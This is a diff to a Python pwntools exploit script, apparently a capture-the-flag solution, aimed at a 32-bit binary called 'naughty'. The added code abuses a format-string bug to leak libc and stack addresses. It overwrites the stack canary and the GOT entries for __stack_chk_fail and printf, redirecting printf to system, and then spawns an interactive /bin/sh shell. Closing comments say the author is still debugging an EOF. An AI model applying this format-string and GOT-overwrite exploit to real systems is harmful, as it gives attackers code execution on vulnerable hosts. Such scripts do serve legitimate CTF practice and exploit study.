@@ -26,13 +26,37 @@ Useful Funcs
 
 '''
 
-# Import Libaries
 from pwn import *
 
-# set context for auto-pwner
-context(arch="i386")
-bin=ELF('./naughty')
-libc=ELF('libc-2.27.so')
+context(arch='i386')
+bin = ELF('./naughty')
+libc = ELF('libc-2.27.so')
+p = process("./naughty")
 
-# Starting process
-p=process("./naughty")
+p.recvuntil(b'name?\n')
+write1 = {0x08049bac:bin.symbols['main']}
+payload = fmtstr_payload(7, write1) + b"pepega %2$p poggers %81$p" #pepega is my marker for libc, poggers is my marker for stack
+print(payload)
+p.sendline(payload)
+p.recvuntil(b'pepega ')
+leak = int(p.recv(10), 16)
+libc.address = leak - libc.symbols['_IO_2_1_stdin_']
+log.info("Leak: " + hex(leak))
+log.info("Base: " + hex(libc.address))
+
+p.recvuntil(b'poggers ')
+canary = int(p.recv(10), 16) - 408 #offset from this stack leak to canary
+log.info("Canary address: " + hex(canary))
+
+
+write2 = {canary:0xdeadbeef, bin.got['__stack_chk_fail']:bin.symbols['main'], bin.got['printf']:libc.symbols['system']}
+payload = fmtstr_payload(7, write2)
+p.recvuntil(b'name?\n')
+p.sendline(payload)
+p.recv()
+# p.recvuntil(b'name?\n')
+p.sendline(b"/bin/sh")
+p.interactive()
+
+# Attemptying to debug why nothing was working; originally, binary was messed up.
+# Now Receiving EOF attempting debug
